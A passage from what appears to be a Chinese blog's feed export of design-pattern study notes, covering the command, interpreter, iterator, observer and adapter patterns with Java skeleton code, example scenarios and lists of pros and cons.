id="宏命令">宏命令</h4><ul><li>宏命令又称为组合命令，它是组合模式和命令模式联用的产物</li><li>宏命令是一个具体命令类，它拥有一个集合，在该集合中包含了对其他命令对象的引用</li><li>当调用宏命令的<code>execute()</code>方法时，将递归调用它所包含的每个成员命令的<code>execute()</code>方法。一个宏命令的成员可以是简单命令，还可以继续是宏命令</li><li>执行一个宏命令将触发多个具体命令的执行，从而实现对命令的批处理</li></ul><h3 id="特点及使用环境-2">特点及使用环境</h3><h4 id="优点-2">优点</h4><ol><li>降低系统的耦合度</li><li>新的命令可以很容易地加入到系统中，符合开闭原则</li><li>可以比较容易地设计一个命令队列或宏命令（组合命令）</li><li>为请求的撤销(Undo)和恢复(Redo)操作提供了一种设计和实现方案</li></ol><h4 id="缺点-2">缺点</h4><ol><li>使用命令模式可能会导致某些系统有过多的具体命令类（针对每一个对请求接收者的调用操作都需要设计一个具体命令类）</li></ol><h4 id="适用环境-2">适用环境</h4><ol><li>系统需要将请求调用者和请求接收者解耦，使得调用者和接收者不直接交互</li><li>系统需要在不同的时间指定请求、将请求排队和执行请求</li><li>系统需要支持命令的撤销(Undo)操作和恢复(Redo)操作</li><li>系统需要将一组操作组合在一起形成宏命令</li></ol><h2 id="解释器模式-Interpreter">解释器模式(Interpreter)</h2><div class="tip "><p><strong>定义</strong>：</p><p>给定一个语言，定义它的文法的一种表示，并定义一个解释器，这个解释器使用该表示来解释语言中的句子。</p></div><h3 id="模式结构-3">模式结构</h3><h4 id="结构图-3">结构图</h4><p><img src="https://oss.iuoyt.com/img/posts/image-20231229175727479.png" alt="image-20231229175727479"></p><h4 id="实现代码-3">实现代码</h4><ul><li><p>抽象表达式（AbstractExpression）</p><p>在抽象表达式中声明了抽象的解释操作，它是所有终结符表达式和非终结符表达式的公共父类。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractExpression</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">interpret</span><span class="params">(Context ctx)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>终结符表达式（TerminalExpression）</p><p>终结符表达式是抽象表达式的子类，它实现了与文法中的终结符相关联的解释操作，在句子中的每一个终结符都是该类的一个实例。通常在一个解释器模式中只有少数几个终结符表达式类，它们的实例可以通过非终结符表达式组成较为复杂的句子。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TerminalExpression</span> <span class="keyword">extends</span> <span class="title class_">AbstractExpression</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">interpret</span><span class="params">(Context ctx)</span> &#123;</span><br><span class="line">        <span class="comment">//终结符表达式的解释操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>非终结符表达式（NonterminalExpression）</p><p>非终结符表达式也是抽象表达式的子类，它实现了文法中非终结符的解释操作，由于在非终结符表达式中可以包含终结符表达式，也可以继续包含非终结符表达式，因此其解释操作一般通过递归的方式完成。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NonterminalExpression</span> <span class="keyword">extends</span> <span class="title class_">AbstractExpression</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> AbstractExpression left;</span><br><span class="line">    <span class="keyword">private</span> AbstractExpression right;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">NonterminalExpression</span><span class="params">(AbstractExpression left,AbstractExpression right)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.left=left;</span><br><span class="line">        <span class="built_in">this</span>.right=right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">interpret</span><span class="params">(Context ctx)</span> &#123;</span><br><span class="line">        <span class="comment">//递归调用每一个组成部分的interpret()方法</span></span><br><span class="line">        <span class="comment">//在递归调用时指定组成部分的连接方式，即非终结符的功能</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>环境类（Context）</p><ul><li>用于存储一些全局信息，一般包含一个HashMap或ArrayList等类型的集合对象（也可以直接由HashMap等集合类充当环境类），存储一系列公共信息，例如变量名与值的映射关系(key/value)等，用于在执行具体的解释操作时从中获取相关信息</li><li>可以在环境类中增加一些所有表达式解释器都共有的功能，以减轻解释器的职责</li><li>当系统无须提供全局公共信息时可以省略环境类，根据实际情况决定是否需要环境类</li></ul>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Context</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">assign</span><span class="params">(String key, String value)</span> &#123;</span><br><span class="line">        <span class="comment">//往环境类中设值</span></span><br><span class="line">        map.put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="comment">//获取存储在环境类中的值</span></span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="应用实例-3">应用实例</h3><blockquote><p>某软件公司要开发一套机器人控制程序，在该机器人控制程序中包含一些简单的英文控制指令，每一个指令对应一个表达式(expression)，该表达式可以是简单表达式也可以是复合表达式。每一个简单表达式由移动方向(direction)，移动方式(action)和移动距离(distance)三部分组成，其中，移动方向包括向上(up)、向下(down)、向左(left)、向右(right)；移动方式包括移动(move)和快速移动(run)；移动距离为一个正整数。两个表达式之间可以通过与(and)连接，形成复合(composite)表达式。</p><p>用户通过对图形化的设置界面进行操作可以创建一个机器人控制指令，机器人在收到指令后将按照指令的设置进行移动，例如输入控制指令“up move 5”将“向上移动5个单位”；输入控制指令“down run 10 and left move 20”将“向下快速移动10个单位再向左移动20个单位”。</p></blockquote><p><img src="https://oss.iuoyt.com/img/posts/image-20231229180138141.png" alt="image-20231229180138141"></p><ul><li>抽象表达式角色：<code>AbstractNode</code></li><li>终结符表达式角色：<code>DirectionNode</code>、<code>ActionNode</code>、<code>DistanceNode</code></li><li>非终结符表达式角色：<code>AndNode</code>、<code>SentenceNode</code></li></ul><h3 id="特点及使用环境-3">特点及使用环境</h3><h4 id="优点-3">优点</h4><ol><li>易于改变和扩展文法</li><li>可以方便地实现一个简单的语言</li><li>实现文法较为容易（有自动生成工具）</li><li>增加新的解释表达式较为方便</li></ol><h4 id="缺点-3">缺点</h4><ol><li>对于复杂文法难以维护</li><li>执行效率较低</li></ol><h4 id="适用环境-3">适用环境</h4><ol><li>可以将一个需要解释执行的语言中的句子表示为一棵抽象语法树</li><li>一些重复出现的问题可以用一种简单的语言来进行表达</li><li>一个语言的文法较为简单</li><li>执行效率不是关键问题</li></ol><h2 id="迭代器模式★-Iterator">迭代器模式★(Iterator)</h2><div class="tip "><p><strong>定义</strong>：</p><p>提供一种方法顺序访问一个聚合对象中的各个元素，而又不用暴露该对象的内部表示。</p></div><h3 id="模式结构-4">模式结构</h3><h4 id="结构图-4">结构图</h4><p><img src="https://oss.iuoyt.com/img/posts/image-20231229140926871.png" alt="image-20231229140926871"></p><h4 id="实现代码-4">实现代码</h4><ul><li><p>抽象迭代器（Iterator）</p><p>它定义了访问和遍历元素的接口，声明了用于遍历数据元素的方法，例如用于获取第一个元素的<code>first()</code>方法、用于访问下一个元素的<code>next()</code>方法、用于判断是否还有下一个元素的<code>hasNext()</code>方法、用于获取当前元素的<code>currentItem()</code>方法等， 在具体迭代器中将实现这些方法。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Iterator</span> &#123;</span><br><span class="line">    <span class="comment">//将游标指向第一个元素</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">first</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">//将游标指向下一个元素</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">next</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">//判断是否存在下一个元素</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasNext</span><span class="params">()</span>;</span><br><span class="line">    <span class="comment">//获取游标指向的当前元素</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">currentItem</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>具体迭代器（ConcreteIterator）</p><p>它实现了抽象迭代器接口，完成对聚合对象的遍历，同时在具体迭代器中通过游标来记录在聚合对象中所处的当前位置，在具体实现时游标通常是一个表示位置的非负整数。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteIterator</span> <span class="keyword">implements</span> <span class="title class_">Iterator</span> &#123;</span><br><span class="line">    <span class="comment">//维持一个对具体聚合对象的引用，以便于访问存储在聚合对象中的数据</span></span><br><span class="line">    <span class="keyword">private</span> ConcreteAggregate objects; </span><br><span class="line">    <span class="comment">//定义一个游标，用于记录当前访问位置</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> cursor;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConcreteIterator</span><span class="params">(ConcreteAggregate objects)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.objects=objects;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">first</span><span class="params">()</span> &#123;  ......  &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">next</span><span class="params">()</span> &#123;  ......  &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasNext</span><span class="params">()</span> &#123;  ......  &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">currentItem</span><span class="params">()</span> &#123;  ......  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>抽象聚合类（Aggregate）</p><p>它用于存储和管理元素对象，声明一个<code>createlterator() </code>方法用于创建一个迭代器对象，充当抽象迭代器工厂角色。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Aggregate</span> &#123;</span><br><span class="line">    Iterator <span class="title function_">createIterator</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>具体聚合类（ConcreteAggregate）</p><p>它是抽象聚合类的子类，实现了在抽象聚合类中声明的<code>createlterator()</code>方法，该方法返回一个与该具体聚合类对应的具体迭代器 ConcreteIterator 实例。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteAggregate</span> <span class="keyword">implements</span> <span class="title class_">Aggregate</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">public</span> Iterator <span class="title function_">createIterator</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConcreteIterator</span>(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="应用实例-4">应用实例</h3><blockquote><p>某软件公司为某商场开发了一套销售管理系统，在对该系统进行分析和设计时，开发人员发现经常需要对系统中的商品数据、客户数据等进行遍历，为了复用这些遍历代码，开发人员设计了一个抽象的数据集合类AbstractObjectList，将存储商品和客户等数据的类作为其子类，AbstractObjectList类结构如下图所示：</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231229142811224.png" alt="AbstractObjectList类结构图"></p><p>在图中，List类型的对象objects用于存储数据，其方法与说明如下表所示：</p><table><thead><tr><th><strong>方法名</strong></th><th><strong>方法说明</strong></th></tr></thead><tbody><tr><td>AbstractObjectList()</td><td>构造方法，用于给objects对象赋值</td></tr><tr><td>addObject()</td><td>增加元素</td></tr><tr><td>removeObject()</td><td>删除元素</td></tr><tr><td>getObjects()</td><td>获取所有元素</td></tr><tr><td>next()</td><td>移至下一个元素</td></tr><tr><td>isLast()</td><td>判断当前元素是否是最后一个元素</td></tr><tr><td>previous()</td><td>移至上一个元素</td></tr><tr><td>isFirst()</td><td>判断当前元素是否是第一个元素</td></tr><tr><td>getNextItem()</td><td>获取下一个元素</td></tr><tr><td>getPreviousItem()</td><td>获取上一个元素</td></tr></tbody></table><p>AbstractObjectList类的子类ProductList和CustomerList分别用于存储商品数据和客户数据。</p><p>通过分析，发现AbstractObjectList类的职责非常重，它既负责存储和管理数据，又负责遍历数据，违背了单一职责原则，实现代码将非常复杂。因此，开发人员决定使用迭代器模式对AbstractObjectList类进行重构，将负责遍历数据的方法提取出来，封装到专门的类中，实现数据存储和数据遍历分离，还可以给不同的具体数据集合类提供不同的遍历方式。</p></blockquote><p><img src="https://oss.iuoyt.com/img/posts/image-20231229143108928.png" alt="image-20231229143108928"></p><ul><li>抽象聚合类：<code>AbstractObjectList</code></li><li>具体聚合类：<code>ProductList</code></li><li>抽象迭代器：<code>AbstractIterator</code></li><li>具体迭代器：<code>ProductIterator</code></li></ul><h3 id="特点及使用环境-4">特点及使用环境</h3><h4 id="优点-4">优点</h4><ol><li>支持以不同的方式遍历一个聚合对象，在同一个聚合对象上可以定义多种遍历方式</li><li>简化了聚合类</li><li>由于引入了抽象层，增加新的聚合类和迭代器类都很方便，无须修改原有代码，符合开闭原则</li></ol><h4 id="缺点-4">缺点</h4><ol><li>在增加新的聚合类时需要对应地增加新的迭代器类，类的个数成对增加，这在一定程度上增加了系统的复杂性</li><li>抽象迭代器的设计难度较大，需要充分考虑到系统将来的扩展。在自定义迭代器时，创建一个考虑全面的抽象迭代器并不是一件很容易的事情</li></ol><h4 id="适用环境-4">适用环境</h4><ol><li>访问一个聚合对象的内容而无须暴露它的内部表示</li><li>需要为一个聚合对象提供多种遍历方式</li><li>为遍历不同的聚合结构提供一个统一的接口，在该接口的实现类中为不同的聚合结构提供不同的遍历方式，而客户端可以一致性地操作该接口</li></ol><h2 id="中介者模式✲">中介者模式✲</h2><h2 id="备忘录模式✲">备忘录模式✲</h2><h2 id="观察者模式★-Observer">观察者模式★(Observer)</h2><div class="tip "><p><strong>定义</strong>：</p><p>定义对象之间的一种一对多依赖关系，使得每当一个对象状态发生改变时，其相关依赖对象都得到通知并被自动更新。</p></div><h3 id="模式结构-5">模式结构</h3><h4 id="结构图-5">结构图</h4><p><img src="https://oss.iuoyt.com/img/posts/image-20231229143706930.png" alt="image-20231229143706930"></p><h4 id="实现代码-5">实现代码</h4><ul><li><p>目标（Subject）</p><p>目标又称为主题，它是指被观察的对象。在目标中定义了一个观察者集合，一个观察目标可以接受任意数量的观察者来观察，它提供一系列方法来增加和删除观察者对象，同时它定义了通知方法<code>notify()</code>。目标类可以是接口，也可以是抽象类或具体类。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Subject</span> &#123;</span><br><span class="line">    <span class="comment">//定义一个观察者集合用于存储所有观察者对象</span></span><br><span class="line">    <span class="keyword">protected</span> ArrayList observers&lt;Observer&gt; = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    <span class="comment">//注册方法，用于向观察者集合中增加一个观察者</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attach</span><span class="params">(Observer observer)</span> &#123;</span><br><span class="line">        observers.add(observer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//注销方法，用于在观察者集合中删除一个观察者</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">detach</span><span class="params">(Observer observer)</span> &#123;</span><br><span class="line">        observers.remove(observer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//声明抽象通知方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">notify</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>具体目标（ConcreteSubject）</p><p>具体目标是目标类的子类，它通常包含有经常发生改变的数据，当它的状态发生改变时将向它的各个观察者发出通知；同时它还实现了在目标类中定义的抽象业务逻辑方法（如果有）。如果无须扩展目标类，则具体目标类可以省略。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteSubject</span> <span class="keyword">extends</span> <span class="title class_">Subject</span> &#123;</span><br><span class="line">    <span class="comment">//实现通知方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">notify</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//遍历观察者集合，调用每一个观察者的响应方法</span></span><br><span class="line">        <span class="keyword">for</span>(Object obs:observers) &#123;</span><br><span class="line">            ((Observer)obs).update();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>观察者（Observer）</p><p>观察者将对观察目标的改变作出反应，观察者一般定义为接口，该接口声明了更新数据的方法<code>update()</code>，因此又称为抽象观察者。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Observer</span> &#123;</span><br><span class="line">    <span class="comment">//声明响应方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>具体观察者（ConcreteObserver）</p><p>在具体观察者中维护一个指向具体目标对象的引用，它存储具体观察者的有关状态，这些状态需要和具体目标的状态保持一致；它实现了在抽象观察者Observer中定义的<code>update()</code>方法。通常在实现时可以调用具体目标类的<code>attach()</code>方法将自己添加到目标类的集合中或通过<code>detach()</code>方法将自己从目标类的集合中 删除。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteObserver</span> <span class="keyword">implements</span> <span class="title class_">Observer</span> &#123;</span><br><span class="line">    <span class="comment">//实现响应方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//具体响应代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="应用实例-5">应用实例</h3><blockquote><p>在某多人联机对战游戏中，多个玩家可以加入同一战队组成联盟，当战队中的某一成员受到敌人攻击时将给所有其他盟友发送通知，盟友收到通知后将做出响应。</p><p>现使用观察者模式设计并实现该过程，以实现战队成员之间的联动。</p></blockquote><p><img src="https://oss.iuoyt.com/img/posts/image-20231229144428657.png" alt="image-20231229144428657"></p><ul><li>抽象目标类：<code>AllyCOntrolCenter</code></li><li>具体目标类：<code>ConcreteAllyControlCenter</code></li><li>抽象观察者：<code>Observer</code></li><li>具体观察者：<code>Player</code></li></ul><h3 id="特点及使用环境-5">特点及使用环境</h3><h4 id="优点-5">优点</h4><ol><li>可以实现表示层和数据逻辑层的分离</li><li>在观察目标和观察者之间建立一个抽象的耦合</li><li>支持广播通信，简化了一对多系统设计的难度</li><li>符合开闭原则，增加新的具体观察者无须修改原有系统代码，在具体观察者与观察目标之间不存在关联关系的情况下，增加新的观察目标也很方便</li></ol><h4 id="缺点-5">缺点</h4><ol><li>将所有的观察者都通知到会花费很多时间</li><li>如果存在循环依赖时可能导致系统崩溃</li><li>没有相应的机制让观察者知道所观察的目标对象是怎么发生变化的，而只是知道观察目标发生了变化</li></ol><h4 id="适用环境-5">适用环境</h4><ol><li>一个抽象模型有两个方面，其中一个方面依赖于另一个方面，将这两个方面封装在独立的对象中使它们可以各自独立地改变和复用</li><li>一个对象的改变将导致一个或多个其他对象发生改变，且并不知道具体有多少对象将发生改变，也不知道这些对象是谁</li><li>需要在系统中创建一个触发链</li></ol><h2 id="状态模式☒">状态模式☒</h2><h2 id="策略模式☒">策略模式☒</h2><h2 id="模板方法模式☒">模板方法模式☒</h2><h2 id="访问者模式✲">访问者模式✲</h2>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式-结构型模式</title>
      <link href="/posts/b6c6dbc4.html"/>
      <url>/posts/b6c6dbc4.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>设计模式系列文章导航</strong></p><ol><li><a href="/posts/bb7571ed.html">设计模式概述</a></li><li><a href="/posts/f9c29644.html">面向对象设计原则</a></li><li><a href="/posts/659b9bb9.html">设计模式 - 创建型模式</a></li><li><a href="/posts/b6c6dbc4.html">设计模式 - 结构型模式</a> 📍当前位置</li><li><a href="/posts/3194e4c1.html">设计模式 - 行为型模式</a></li></ol></blockquote><h2 id="结构型模式">结构型模式</h2><ul><li>结构型模式关注如何将现有类或对象组织在一起形成更加强大的结构。</li><li>不同的结构型模式从不同的角度组合类或对象，它们在尽可能满足各种面向对象设计原则的同时为类或对象的组合提供一系列巧妙的解决方案。</li></ul><h2 id="适配器模式-Adapter">适配器模式(Adapter)</h2><div class="tip "><p><strong>定义</strong>：</p><p>将一个类的接口转换成客户希望的另一个接口。适配器模式让那些接口不兼容的类可以一起工作。</p></div><h3 id="模式结构">模式结构</h3><h4 id="结构图">结构图</h4><ul><li><p>类适配器</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231229132413600.png" alt="类适配器"></p></li><li><p>对象适配器</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231229132448870.png" alt="对象适配器"></p></li></ul><h4 id="实现代码">实现代码</h4><ul><li><p>目标抽象类（Target）</p><p>目标抽象类定义客户所需的接口，可以是一个抽象类或接口，也可以是具体类。在类适配器中，由于Java语言不支持多重继承，它只能是接口。</p></li><li><p>适配器类（Adapter）</p><p>它可以调用另一个接口，作为一个转换器，对Adaptee和Target进行适配。适配器Adapter是适配器模式的核心，在类适配器中，它通过实现Target接口并继承Adaptee类来使二者产生联系，在对象适配器中，它通过继承Target并关联一个Adaptee对象使二者产生联系。</p><ul><li><p>类适配器</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Adapter</span> <span class="keyword">extends</span> <span class="title class_">Adaptee</span> <span class="keyword">implements</span> <span class="title class_">Target</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">request</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.specificRequest();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>对象适配器</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Adapter</span> <span class="keyword">extends</span> <span class="title class_">Target</span> &#123;</span><br><span class="line">    <span class="comment">//维持一个对适配者对象的引用</span></span><br><span class="line">    <span class="keyword">private</span> Adaptee adaptee; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Adapter</span><span class="params">(Adaptee adaptee)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.adaptee=adaptee;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">request</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//转发调用</span></span><br><span class="line">        adaptee.specificRequest(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>适配者类（Adaptee）</p><p>适配者即被适配的角色，它定义了一个已经存在的接口，这个接口需要适配，适配者类一般是一个具体类，包含了客户希望使用的业务方法，在某些情况下甚至没有适配者类的源代码。</p></li></ul><h3 id="应用实例">应用实例</h3><blockquote><p>某公司欲开发一款儿童玩具汽车，为了更好地吸引小朋友的注意力，该玩具汽车在移动过程中伴随着灯光闪烁和声音提示。在该公司以往的产品中已经实现了控制灯光闪烁（例如警灯闪烁）和声音提示（例如警笛音效）的程序，为了重用先前的代码并且使得汽车控制软件具有更好的灵活性和扩展性，现使用适配器模式设计该玩具汽车控制软件。</p></blockquote><p><img src="https://oss.iuoyt.com/img/posts/image-20231229133559453.png" alt="image-20231229133559453"></p><ul><li>抽象目标：<code>CarController</code></li><li>适配者：<code>PoliceSound</code>、<code>PoliceLamp</code></li><li>适配器：<code>PoliceCarAdapter</code></li></ul><h3 id="特点及使用环境">特点及使用环境</h3><h4 id="优点">优点</h4><ol><li>将目标类和适配者类解耦，通过引入一个适配器类来重用现有的适配者类，无须修改原有结构</li><li>增加了类的透明性和复用性，提高了适配者的复用性，同一个适配者类可以在多个不同的系统中复用</li><li>灵活性和扩展性非常好</li><li>类适配器模式：置换一些适配者的方法很方便</li><li>对象适配器模式：可以把多个不同的适配者适配到同一个目标，还可以适配一个适配者的子类</li></ol><h4 id="缺点">缺点</h4><ol><li>类适配器模式：<ol><li>一次最多只能适配一个适配者类，不能同时适配多个适配者</li><li>适配者类不能为最终类</li><li>目标抽象类只能为接口，不能为类</li></ol></li><li>对象适配器模式：在适配器中置换适配者类的某些方法比较麻烦</li></ol><h4 id="适用环境">适用环境</h4><ol><li>系统需要使用一些现有的类，而这些类的接口不符合系统的需要，甚至没有这些类的源代码</li><li>创建一个可以重复使用的类，用于和一些彼此之间没有太大关联的类，包括一些可能在将来引进的类一起工作</li></ol><h2 id="桥接模式☒">桥接模式☒</h2><h2 id="组合模式★-Composite">组合模式★(Composite)</h2><div class="tip "><p><strong>定义</strong>：</p><p>组合多个对象形成树形结构以表示具有部分-整体关系的层次结构。组合模式让客户端可以统一对待单个对象和组合对象。</p></div><h3 